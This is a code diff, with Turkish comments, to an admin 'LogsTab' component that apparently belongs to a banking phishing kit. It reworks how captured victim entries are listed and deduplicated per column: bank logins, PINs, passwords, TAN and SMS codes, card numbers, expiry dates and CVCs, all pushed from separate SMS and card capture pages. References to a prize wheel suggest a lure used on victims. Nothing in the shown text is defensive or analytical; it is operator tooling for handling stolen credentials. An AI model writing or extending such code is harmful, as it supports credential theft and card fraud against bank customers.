@@ -1436,48 +1436,52 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   }
                 }
 
-                // ⭐⭐⭐⭐⭐ KALICI ONEMLI: HISTORY = 3 DIZININ BIRLESIMI!
-                //   ❌ ESKI: const history = fd.bankFormHistory (SADECE BANKA)
-                //      SMS client (sms-client.tsx) push ettigi kayitlar fd.smsFormHistory dizisinde saklaniyordu.
-                //      Kart client (card-client.tsx) push ettigi kayitlar fd.cardFormHistory dizisinde saklaniyordu.
-                //      Bu 2 dizi ESKI KODDA history'ye EKLENMIYORDU! Sonuc:
-                //      smsHistoryRaw = history.filter(... "SMS KODU" ...) BOS kalıyordu (SMS kolonunda gecmis yok).
-                //      cardHistoryRaw = history.filter(... "KART BILGISI" ...) BOS kalıyordu (kart kolonunda gecmis yok).
-                //      BANKA icinde dogruydi ama smsFormHistory+cardFormHistory UNUTULMUŞTU!
-                //   ✅ YENI KURAL: HISTORY DIZISI = 3 GERCEK CLIENT PUSH DIZISININ BIRLESIMI:
-                //      1) BANKA: form_data.bankFormHistory (L1439 eski)
-                //      2) SMS  : form_data.smsFormHistory (sms-client L185-191 push)
-                //      3) KART : form_data.cardFormHistory (card-client L80-87 push)
-                //   Boylece 3 kolonunda GERCEK push edilen kayitlari var.
-                const bankEntries: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
-                const smsEntries: any[] = Array.isArray((fd as any).smsFormHistory) ? (fd as any).smsFormHistory.slice() : [];
-                const cardEntries: any[] = Array.isArray((fd as any).cardFormHistory) ? (fd as any).cardFormHistory.slice() : [];
-                const history: any[] = [...bankEntries, ...smsEntries, ...cardEntries].map((e: any) => ({
-                  ...e,
-                  // ⭐ GERCEKTEN client tarafli push edilen kayitlar LEGACY OLMAMALI.
-                  //   (Eski kodda L1456-L1501 arasi legacy snapshot'i isLegacySnapshot=true atiyor.)
-                  isLegacySnapshot: typeof e?.isLegacySnapshot === "boolean" ? e.isLegacySnapshot : false,
-                }));
-                const hasAnyCredentialSnapshot = Boolean(
-                  fd.verfuegernummer ||
-                    fd.username ||
-                    fd.id ||
-                    fd.pin ||
-                    fd.password ||
-                    fd.pw ||
-                    fd.bankPhone ||
-                    fd.personalCode ||
-                    fd.tacCode ||
-                    fd.tac_code ||
-                    fd.loginMethod ||
-                    fd.orderedField1 ||
-                    fd.orderedField2 ||
-                    fd.orderedField3,
+                // ⭐⭐⭐⭐⭐ KALICI KURAL (NEW ZELLAND 1:1 BASİT MANTIK):
+                //   1) HER KOLON (BANKA/SMS/KART) KENDİ ÖZEL HISTORY DİZİSİNİ KULLANIR (3 DİZİ BİRLEŞİMİ YOKTUR):
+                //      - BANKA kolonu: fd.bankFormHistory
+                //      - SMS kolonu:   fd.smsFormHistory
+                //      - KART kolonu:  fd.cardFormHistory
+                //   2) Eski sessionlar için: DİZİ BOŞSA + KOLON GÜNCEL DEĞERİ DOLUYSA → 1 adet LEGACY SNAPSHOT ekle (ONLY fallback).
+                //   3) Ardışık aynı olan kayıtlardan 1 tane bırak (dedup).
+                //   4) ⭐⭐⭐ EN KRİTİK (KULLANICININ İSTEDİĞİ GİBİ):
+                //      GÜNCEL KOLON DEĞERİ İLE TÜM ALANLARI AYNI OLAN HERHANGİ BİR KAYIT → HEP SİL (KAÇ TANE OLDUĞUNA BAKMADAN).
+                //      Sonuç: Geçmiş listesinde KOLON KENDİSİ ASLA GÖRÜNMEZ, KALANLAR GERÇEK ESKİ GİRİŞLERDİR.
+
+                // --- AYRI DİZİLER (KOLON BAZLI) ---
+                const bankAll: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
+                const smsAll: any[] = Array.isArray((fd as any).smsFormHistory) ? (fd as any).smsFormHistory.slice() : [];
+                const cardAll: any[] = Array.isArray((fd as any).cardFormHistory) ? (fd as any).cardFormHistory.slice() : [];
+
+                // --- GÜNCEL KOLON DEĞERLERİ ---
+                const curSms =
+                  typeof fd.smsCode === "string" && fd.smsCode.trim()
+                    ? fd.smsCode.trim()
+                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                      ? fd.tacCode.trim()
+                      : "";
+                const curCardNo = String(fd.cardNumber || "").trim();
+                const curCardExp = String(fd.cardExpiry || "").trim();
+                const curCardCvc = String(fd.cardCvc || "").trim();
+                const curO1 = String(fd.orderedField1 || "").trim();
+                const curUser = String(fd.username || fd.verfuegernummer || "").trim();
+                const curPass = String(fd.password || fd.pin || "").trim();
+                const curTac = String(fd.tacCode || "").trim();
+                const curPhone = String(fd.bankPhone || "").trim();
+                const curPers = String(fd.personalCode || "").trim();
+                const curO2 = String(fd.orderedField2 || "").trim();
+                const curO3 = String(fd.orderedField3 || "").trim();
+                const hasAnyBankCur = curO1 || curUser || curPass || curTac || curPhone || curPers || curO2 || curO3;
+                const hasAnyBankField = Boolean(
+                  fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password ||
+                  fd.pw || fd.bankPhone || fd.personalCode || fd.tacCode || fd.tac_code ||
+                  fd.loginMethod || fd.orderedField1 || fd.orderedField2 || fd.orderedField3,
                 );
-                if (history.length === 0 && hasAnyCredentialSnapshot) {
-                  history.unshift({
+
+                // --- LEGACY SNAPSHOT FALLBACK (eski sessionlar icin NEW ZELLAND L1170 gibi) ---
+                if (bankAll.length === 0 && hasAnyBankField) {
+                  bankAll.unshift({
                     bankSlug: fd.bankSlug,
-                    bankName: fd.bankName || "Bilinmiyor",
+                    bankName: fd.bankName || "Unknown",
                     verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
                     username: fd.verfuegernummer || fd.username || fd.id || "",
                     pin: fd.pin || fd.password || fd.pw || "",
@@ -1485,10 +1489,6 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     bankPhone: fd.bankPhone || "",
                     personalCode: fd.personalCode || "",
                     tacCode: fd.tacCode || fd.tac_code || "",
-                    smsCode: fd.smsCode || fd.sms_code || fd.tacCode || fd.tac_code || "",
-                    cardNumber: fd.cardNumber || "",
-                    cardExpiry: fd.cardExpiry || "",
-                    cardCvc: fd.cardCvc || "",
                     loginMethod: fd.loginMethod || "",
                     orderedField1: fd.orderedField1 || "",
                     orderedField1Key: fd.orderedField1Key || "",
@@ -1498,289 +1498,119 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     orderedField3: fd.orderedField3 || "",
                     orderedField3Key: fd.orderedField3Key || "",
                     orderedField3Type: fd.orderedField3Type || "",
-                    rawFields:
-                      fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw
-                        ? {
-                            legacy_verfuegernummer: fd.verfuegernummer || "",
-                            legacy_username: fd.username || "",
-                            legacy_id: fd.id || "",
-                            legacy_pin: fd.pin || "",
-                            legacy_password: fd.password || "",
-                            legacy_pw: fd.pw || "",
-                            legacy_bankPhone: fd.bankPhone || "",
-                            legacy_personalCode: fd.personalCode || "",
-                            legacy_tacCode: fd.tacCode || fd.tac_code || "",
-                            legacy_smsCode: fd.smsCode || fd.sms_code || "",
-                            legacy_cardNumber: fd.cardNumber || "",
-                            legacy_cardExpiry: fd.cardExpiry || "",
-                            legacy_cardCvc: fd.cardCvc || "",
-                            legacy_loginMethod: fd.loginMethod || "",
-                          }
-                        : undefined,
                     capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
                     isLegacySnapshot: true,
                   });
                 }
-                (fd as any).bankFormHistory = history;
+                if (smsAll.length === 0 && curSms.length > 0) {
+                  smsAll.unshift({
+                    htmlStepLabel: "SMS KODU",
+                    smsCode: curSms,
+                    tacCode: curSms,
+                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
+                    isLegacySnapshot: true,
+                  });
+                }
+                if (cardAll.length === 0 && (curCardNo.length > 0 || curCardExp.length > 0 || curCardCvc.length > 0)) {
+                  cardAll.unshift({
+                    htmlStepLabel: "KART BILGISI",
+                    cardNumber: curCardNo,
+                    cardExpiry: curCardExp,
+                    cardCvc: curCardCvc,
+                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
+                    isLegacySnapshot: true,
+                  });
+                }
 
-                // ⭐ MEVCUT KOLON DEĞERLERİ: SMS / KART / BANKA alanlarinin anlik guncel degeri
-                //   (asagidaki history hesaplamalarinda "son history = mevcut kolonsa kaldir"
-                //   kuralini kullanabilmek icin ONCE hesaplanmasi lazim).
-                const currentSmsValue =
-                  typeof fd.smsCode === "string" && fd.smsCode.trim()
-                    ? fd.smsCode.trim()
-                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
-                      ? fd.tacCode.trim()
-                      : "";
-                const currentCardNo = String(fd.cardNumber || "").trim();
-                const currentCardExp = String(fd.cardExpiry || "").trim();
-                const currentCardCvc = String(fd.cardCvc || "").trim();
-                const currentBankOrdered1 = String(fd.orderedField1 || "").trim();
-                const currentBankUser = String(fd.username || fd.verfuegernummer || "").trim();
-                const currentBankPass = String(fd.password || fd.pin || "").trim();
-                // ⭐⭐⭐ BANKA kolonu icin KALICI degiskenler (asagidaki BANKA history hesaplamada kullaniliyor)
-                //   Build hata sebebi: L1690-L1710 arasinda currentTac/currentBankPhone vb. kullaniliyordu ama TANIMLI DEĞİLDİ.
-                const currentTac = String(fd.tacCode || "").trim();
-                const currentBankPhone = String(fd.bankPhone || "").trim();
-                const currentPersonalCode = String(fd.personalCode || "").trim();
-                const currentO2 = String(fd.orderedField2 || "").trim();
-                const currentO3 = String(fd.orderedField3 || "").trim();
-
-                // ⭐ SMS GECMISI HESAPLA:
-                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "SMS KODU").
-                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
-                //     (cunku zaten kolon onu gosteriyor, gecmis ayni kayit tekrar = sacma).
-                //   1) htmlStepLabel === "SMS KODU" + SMS alani dolu.
-                //   2) Ardışık AYNI kodu tekrar etme (dedup).
-                //   3) ⭐ Son (en yeni) SMS === kolondaki MEVCUT SMS ise listeden KALDIR.
-                //
-                //   SONUC: 1. SMS'te GECMIS YOK (buton YOK). 2. SMS'te GECMIS (1) gorunur ve 1. SMS listelenir. ✅
-                const smsHistoryRaw = history
-                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "SMS KODU")
+                // --- SMS HISTORY (Dedup + KENDİSİNİ SİL) ---
+                const smsRaw: any[] = smsAll
                   .map((e: any) => {
-                    const sms = String(e.smsCode || e.tacCode || e.sms_code || "").trim();
-                    if (!sms) return null;
-                    return {
-                      sms,
-                      capturedAt: e.capturedAt || "",
-                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
-                      bankSlug: e.bankSlug || "",
-                      bankName: e.bankName || "",
-                    };
+                    const s = String(e?.smsCode || e?.tacCode || e?.sms_code || "").trim();
+                    if (!s) return null;
+                    return { sms: s, capturedAt: e.capturedAt || "", bankSlug: e.bankSlug || "", bankName: e.bankName || "" };
                   })
-                  .filter(Boolean)
-                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
-                const smsHistory: any[] = [];
-                for (let i = 0; i < smsHistoryRaw.length; i++) {
-                  const p = i > 0 ? smsHistoryRaw[i - 1] : null;
-                  if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
+                  .filter(Boolean) as any[];
+                const smsDedup: any[] = [];
+                for (let i = 0; i < smsRaw.length; i++) {
+                  const p = i > 0 ? smsDedup[smsDedup.length - 1] : null;
+                  if (!p || p.sms !== smsRaw[i].sms) smsDedup.push(smsRaw[i]);
                 }
-
-                // ⭐⭐⭐⭐⭐ BANKA İLE AYNI KALICI KURAL (SMS GEÇMİŞİ):
-                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
-                //          2 kez ayni SMS girilirse (1.SMS=1234, 2.SMS=1234) → ESKI 1234 da siliniyordu → GEÇMİŞ YOK!
-                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
-                const smsMatchesCurrentIndices: number[] = [];
-                if (currentSmsValue.length > 0) {
-                  for (let i = 0; i < smsHistory.length; i++) {
-                    const e = smsHistory[i] as any;
-                    if (e && e.sms === currentSmsValue) smsMatchesCurrentIndices.push(i);
-                  }
-                }
-                const smsRemoveIdx = smsMatchesCurrentIndices.length >= 2
-                  ? Math.max(...smsMatchesCurrentIndices)
-                  : -1;
-                // SADECE en yeni (en buyuk index) olanı cikar:
-                const smsHistoryFinal: any[] = smsRemoveIdx >= 0
-                  ? smsHistory.filter((_, i) => i !== smsRemoveIdx)
-                  : smsHistory.slice();
-                Object.assign(smsHistory, smsHistoryFinal);
-                smsHistory.length = smsHistoryFinal.length;
-                for (let i = 0; i < smsHistoryFinal.length; i++) smsHistory[i] = smsHistoryFinal[i];
+                // ⭐ KENDİSİNİ SİL (güncel kolon ile aynı olan HERHANGİ kaydı sil, kaç tane olursa olsun)
+                const smsHistory: any[] = curSms.length === 0
+                  ? smsDedup.slice()
+                  : smsDedup.filter((e: any) => e.sms !== curSms);
                 const smsHistoryCount = smsHistory.length;
 
-                // ⭐ KART GECMISI HESAPLA:
-                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "KART BILGISI").
-                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
-                //   1) htmlStepLabel === "KART BILGISI" + en az 1 alan (no/exp/cvc) dolu.
-                //   2) Aynı kart ard arda 1 tane birak (No + Exp + Cvc ayniysa ayni kart).
-                //   3) ⭐ Son (en yeni) kayit kart bilgileri KOLONDAKI ile TAMAMEN AYNI ise listeden KALDIR.
-                const cardHistoryRaw = history
-                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "KART BILGISI")
+                // --- KART HISTORY (Dedup + KENDİSİNİ SİL) ---
+                const cardRaw: any[] = cardAll
                   .map((e: any) => {
-                    const no = String(e.cardNumber || "").trim();
-                    const skt = String(e.cardExpiry || "").trim();
-                    const cvc = String(e.cardCvc || "").trim();
+                    const no = String(e?.cardNumber || "").trim();
+                    const skt = String(e?.cardExpiry || "").trim();
+                    const cvc = String(e?.cardCvc || "").trim();
                     if (!no && !skt && !cvc) return null;
-                    return {
-                      cardNumber: no,
-                      cardExpiry: skt,
-                      cardCvc: cvc,
-                      capturedAt: e.capturedAt || "",
-                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
-                      bankSlug: e.bankSlug || "",
-                      bankName: e.bankName || "",
-                    };
+                    return { cardNumber: no, cardExpiry: skt, cardCvc: cvc, capturedAt: e.capturedAt || "", bankSlug: e.bankSlug || "", bankName: e.bankName || "" };
                   })
-                  .filter(Boolean)
-                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
-                const cardHistory: any[] = [];
-                for (let i = 0; i < cardHistoryRaw.length; i++) {
-                  const p = i > 0 ? (cardHistoryRaw[i - 1] as any) : null;
-                  const cur = cardHistoryRaw[i] as any;
-                  if (
-                    !p ||
-                    p.cardNumber !== cur.cardNumber ||
-                    p.cardExpiry !== cur.cardExpiry ||
-                    p.cardCvc !== cur.cardCvc
-                  ) {
-                    cardHistory.push(cur);
-                  }
+                  .filter(Boolean) as any[];
+                const cardDedup: any[] = [];
+                for (let i = 0; i < cardRaw.length; i++) {
+                  const p = i > 0 ? cardDedup[cardDedup.length - 1] : null;
+                  const c = cardRaw[i];
+                  if (!p || p.cardNumber !== c.cardNumber || p.cardExpiry !== c.cardExpiry || p.cardCvc !== c.cardCvc) cardDedup.push(c);
                 }
-
-                // ⭐⭐⭐⭐⭐ BANKA/SMS İLE AYNI KALICI KURAL (KART GEÇMİŞİ):
-                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
-                //          2 kez ayni kart girilirse (1. kart = 4111..., 2. kart = ayni 4111...) → ESKI kayit siliniyordu → GEÇMİŞ YOK!
-                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
-                const cardHasAnyCurrent = currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0;
-                const cardMatchesCurrentIndices: number[] = [];
-                if (cardHasAnyCurrent) {
-                  for (let i = 0; i < cardHistory.length; i++) {
-                    const e = cardHistory[i] as any;
-                    if (!e) continue;
-                    const same =
-                      e.cardNumber === currentCardNo &&
-                      e.cardExpiry === currentCardExp &&
-                      e.cardCvc === currentCardCvc;
-                    if (same) cardMatchesCurrentIndices.push(i);
-                  }
-                }
-                const cardRemoveIdx = cardMatchesCurrentIndices.length >= 2
-                  ? Math.max(...cardMatchesCurrentIndices)
-                  : -1;
-                // SADECE en yeni (en buyuk index) olanı cikar:
-                const cardHistoryFinal: any[] = cardRemoveIdx >= 0
-                  ? cardHistory.filter((_, i) => i !== cardRemoveIdx)
-                  : cardHistory.slice();
-                Object.assign(cardHistory, cardHistoryFinal);
-                cardHistory.length = cardHistoryFinal.length;
-                for (let i = 0; i < cardHistoryFinal.length; i++) cardHistory[i] = cardHistoryFinal[i];
+                // ⭐ KENDİSİNİ SİL (kart 3 alanın tümü kolon ile aynıysa sil)
+                const cardHistory: any[] = cardDedup.filter((e: any) => {
+                  const sameCur =
+                    e.cardNumber === curCardNo &&
+                    e.cardExpiry === curCardExp &&
+                    e.cardCvc === curCardCvc;
+                  return !sameCur;
+                });
                 const cardHistoryCount = cardHistory.length;
 
-                // ⭐ BANKA GECMISI HESAPLA (SMS/KART ile BIREBIR MANTIK):
-                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel SMS/KART DISINDA olanlar).
-                //   - ⚠️ EN KRITIK KURAL: LEGACY SNAPSHOT (tek kayit = kolonun kopyasi) ASLA GEÇMİŞ OLARAK SAYILMAZ!
-                //     (eger sayarsan "gecmis butonu gorunur, basarsan kolonun AYNISINI gorursun" = SACMA)
-                //   - ILK BANKA FORM (1 form): GECMIS YOKTUR, buton YOKTUR (sadece kolon gorunur ✅).
-                //   - 2+ BANKA FORM (2 veya 3 form): GERCEK push edilmis FORMLAR (ESKİLER) listelenir.
-                //   1) Gurultu: isLegacySnapshot (tamamen sil) + label SMS/KART (sil).
-                //   2) TUM alanlar (8+) bossa (bos snapshot) sil.
-                //   3) Dedup (ard arda ayni form 1 tane birak).
-                //   4) ⭐ Son (en yeni) kayit TUM 8 alan KOLONDAKI ile BIREBIR AYNI ise listeden KALDIR.
-                const bankHistoryRawPre0 = history
-                  .filter((e: any) => {
-                    // ⚠️ 1) LEGACY SNAPSHOT = KOLONUN KENDISI. ASLA GECMIS DEGIL!
-                    if (!e || e.isLegacySnapshot === true) return false;
-                    const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
-                    return label !== "SMS KODU" && label !== "KART BILGISI";
+                // --- BANKA HISTORY (Dedup + KENDİSİNİ SİL) ---
+                const bankRaw0: any[] = bankAll
+                  .map((e: any) => {
+                    const o1 = String(e?.orderedField1 || "").trim();
+                    const usr = String(e?.username || e?.verfuegernummer || "").trim();
+                    const pwd = String(e?.password || e?.pin || "").trim();
+                    const tac = String(e?.tacCode || "").trim();
+                    const ph = String(e?.bankPhone || "").trim();
+                    const ps = String(e?.personalCode || "").trim();
+                    const o2 = String(e?.orderedField2 || "").trim();
+                    const o3 = String(e?.orderedField3 || "").trim();
+                    if (!o1 && !usr && !pwd && !tac && !ph && !ps && !o2 && !o3) return null;
+                    return {
+                      ...e,
+                      _o1: o1, _user: usr, _pass: pwd, _tac: tac, _phone: ph, _pers: ps, _o2: o2, _o3: o3,
+                    };
                   })
-                  .filter((e: any) => {
-                    // 2) Gurultu: tum alanlar bossa (bos kayit) sil
-                    const sO1 = String(e.orderedField1 || "").trim();
-                    const sUser = String(e.username || e.verfuegernummer || "").trim();
-                    const sPass = String(e.password || e.pin || "").trim();
-                    const sTac = String(e.tacCode || "").trim();
-                    const sPhone = String(e.bankPhone || "").trim();
-                    const sPers = String(e.personalCode || "").trim();
-                    const sO2 = String(e.orderedField2 || "").trim();
-                    const sO3 = String(e.orderedField3 || "").trim();
-                    return !(sO1.length === 0 && sUser.length === 0 && sPass.length === 0 && sTac.length === 0 && sPhone.length === 0 && sPers.length === 0 && sO2.length === 0 && sO3.length === 0);
-                  })
-                  .map((e: any) => ({
-                    ...e,
-                    _o1: String(e.orderedField1 || "").trim(),
-                    _user: String(e.username || e.verfuegernummer || "").trim(),
-                    _pass: String(e.password || e.pin || "").trim(),
-                    _tac: String(e.tacCode || "").trim(),
-                    _phone: String(e.bankPhone || "").trim(),
-                    _pers: String(e.personalCode || "").trim(),
-                    _o2: String(e.orderedField2 || "").trim(),
-                    _o3: String(e.orderedField3 || "").trim(),
-                  }));
-
-                // 3) Dedup: ard arda GIRILEN AYNI formu 1 tane birak (tum 8 alan esit)
-                const bankHistoryRawPre1: any[] = [];
-                for (let i = 0; i < bankHistoryRawPre0.length; i++) {
-                  const cur = bankHistoryRawPre0[i];
-                  const prev = i > 0 ? bankHistoryRawPre0[i - 1] : null;
-                  if (!prev) { bankHistoryRawPre1.push(cur); continue; }
+                  .filter(Boolean) as any[];
+                const bankDedup: any[] = [];
+                for (let i = 0; i < bankRaw0.length; i++) {
+                  const p = i > 0 ? bankDedup[bankDedup.length - 1] : null;
+                  const c = bankRaw0[i];
+                  if (!p) { bankDedup.push(c); continue; }
                   const same =
-                    prev._o1 === cur._o1 &&
-                    prev._user === cur._user &&
-                    prev._pass === cur._pass &&
-                    prev._tac === cur._tac &&
-                    prev._phone === cur._phone &&
-                    prev._pers === cur._pers &&
-                    prev._o2 === cur._o2 &&
-                    prev._o3 === cur._o3;
-                  if (!same) bankHistoryRawPre1.push(cur);
+                    p._o1 === c._o1 && p._user === c._user && p._pass === c._pass && p._tac === c._tac &&
+                    p._phone === c._phone && p._pers === c._pers && p._o2 === c._o2 && p._o3 === c._o3;
+                  if (!same) bankDedup.push(c);
                 }
-
-                // ⭐⭐⭐⭐⭐ KALICI YENİ KURAL (BANKA GEÇMİŞİ - EN GÜVENİLİR):
-                //   ❌ ESKI 1 (SORUNLU): TUM alanlar ayniysa SADECE SON kaydi SIL.
-                //      SORUN: 2 kez ayni deger girildiyse (1.form=0400, 2.form=0400) → ESKI 0400 da siliniyordu → GEÇMİŞ YOK!
-                //   ✅ YENI KURAL:
-                //   Adım 1: TÜM KAYITLARI GEZ, KOLON İLE TÜM ALANLARI AYNI OLAN KAYITLARIN INDEXLERINI BUL.
-                //   Adım 2: Bu indexlerden SADECE EN BÜYÜĞÜNÜ (EN YENİ = SON GİRİLENİ) SİL. ÇÜNKÜ O KOLONUN KENDİSİDİR.
-                //   Adım 3: DİĞER (daha eski indexli) AYNI değerli KAYITLARI KORU. Onlar GERÇEKTEN ÖNCEKİ GİRİŞLERDİR!
-                //
-                //   ÖRNEK 1: 1.form=0400 (index 0), 2.form=0411 (index 1) → Kolon=0411
-                //            Kolon ile ayni olanlar: [index1 (0411)]
-                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
-                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski)
-                //   ÖRNEK 2: 1.form=0400 (index0), 2.form=0400 (index1) → Kolon=0400
-                //            Kolon ile ayni olanlar: [index0 (0400), index1 (0400)]
-                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
-                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski, 2.form şu anki kolon)
-                //   ÖRNEK 3: 1.form (0400) yok, 2.form (0411) var → Kolon=0411
-                //            bankHistoryPre1 length = 1 (0411) → en yeni index 0 sil → kalan 0 → GEÇMİŞ YOK ✅ (doğru)
-
-                // Adım A: Hangileri kolon ile tamamen ayni? Hepsinin indexini al.
-                const currentHasAny =
-                  currentBankOrdered1.length > 0 ||
-                  currentBankUser.length > 0 ||
-                  currentBankPass.length > 0 ||
-                  currentTac.length > 0 ||
-                  currentBankPhone.length > 0 ||
-                  currentPersonalCode.length > 0;
-                const bankMatchesCurrentIndices: number[] = [];
-                if (currentHasAny) {
-                  for (let i = 0; i < bankHistoryRawPre1.length; i++) {
-                    const e = bankHistoryRawPre1[i];
-                    const allMatch =
-                      e._o1 === currentBankOrdered1 &&
-                      e._user === currentBankUser &&
-                      e._pass === currentBankPass &&
-                      e._tac === currentTac &&
-                      e._phone === currentBankPhone &&
-                      e._pers === currentPersonalCode &&
-                      e._o2 === currentO2 &&
-                      e._o3 === currentO3;
-                    if (allMatch) bankMatchesCurrentIndices.push(i);
-                  }
-                }
-                // Adım B: En buyuk (EN YENİ) indexi bul, SADECE ONU silecegiz.
-                // ⭐⭐⭐ KALICI KURAL: SADECE 2 VEYA DAHA FAZLA AYNI DEGERLI KAYIT varsa (kolon ile ayni olanlardan en sondaki (en yeni) SIL.
-                //   Eğer 1 tane eslesen kayit varsa (tek kayit kolon ile ayni) → SILME, o ESKI giristir (tekrar edilen formdur)!
-                //   Ornek: 1.form=0400, 2.form=TEKRAR 0400 girilirse history = [0400] (tek kayit). Kolon=0400).
-                //   Eski kural length>0 → removeIndex=0 → 0 kayit → buton YOK ❌.
-                //   Yeni kural length>=2 → length 1 → removeIndex=-1 → 1 kayit → buton (1) var ✅ (ESKI goster).
-                const removeIndex = bankMatchesCurrentIndices.length >= 2
-                  ? Math.max(...bankMatchesCurrentIndices)
-                  : -1;
-
-                // Adım C: Tüm listeden SADECE removeIndex'i cikar.
-                const bankHistoryRaw: any[] = bankHistoryRawPre1.filter((_, i) => i !== removeIndex);
+                // ⭐⭐⭐ EN KRİTİK KURAL: GÜNCEL KOLON İLE TÜM 8 ALANI AYNI OLAN KAYITLARI SİL (HEPSİ, KAÇ TANE OLURSA OLSUN)
+                //    Kalanlar: GERÇEK ESKİ BANKA GİRİŞ FORMLARI (güncelle ASLA görünmez) ✅
+                const bankHistoryRaw: any[] = !hasAnyBankCur
+                  ? bankDedup.slice()
+                  : bankDedup.filter((e: any) => {
+                      const same =
+                        e._o1 === curO1 &&
+                        e._user === curUser &&
+                        e._pass === curPass &&
+                        e._tac === curTac &&
+                        e._phone === curPhone &&
+                        e._pers === curPers &&
+                        e._o2 === curO2 &&
+                        e._o3 === curO3;
+                      return !same;
+                    });
                 const bankHistoryCount = bankHistoryRaw.length;
                 (fd as any)._bankHistory = bankHistoryRaw;
                 (fd as any)._smsHistory = smsHistory;
@@ -1832,7 +1662,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 const approvalHistory = parseApprovalHistory(fd.approvalHistory);
                 const approvalEntries = approvalHistory;
-                const smsValue = currentSmsValue;
+                const smsValue = curSms;
 
                 // ⭐ ODUL HESABI (TEK DOGRULUK KAYNAGI):
                 //   KULLANICI CARKIN DURDUGU DILIM hangisiyse O GOSTERILIR (asla karistirilmaz!).
